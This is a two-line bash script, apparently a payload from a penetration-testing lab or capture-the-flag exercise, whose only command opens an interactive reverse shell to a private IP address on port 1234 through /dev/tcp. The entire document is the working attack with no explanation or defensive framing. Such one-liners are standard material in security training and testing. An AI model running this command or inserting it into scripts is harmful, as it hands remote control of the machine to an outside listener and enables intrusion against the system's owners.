#!/bin/bash

bash -i >& /dev/tcp/10.10.16.224/1234 0>&1
